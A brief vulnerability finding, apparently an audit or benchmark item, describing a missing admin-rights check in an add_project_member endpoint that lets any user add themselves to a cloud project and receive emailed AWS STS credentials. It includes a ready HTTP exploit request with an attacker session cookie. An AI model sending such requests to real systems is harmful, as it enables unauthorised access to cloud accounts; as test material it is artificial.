diagnosis: add_project_member looks up CloudProject without ensuring request.user has admin rights on that project. When members.add() is invoked, the m2m_changed signal immediately provisions AWS STS credentials for the project's IAM role and emails them, letting an attacker grant themselves access to any AWS environment.
exploit_request:
POST /api/cloud-projects/780/members/ HTTP/1.1
Host: console.example.com
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

user_id=attacker_id
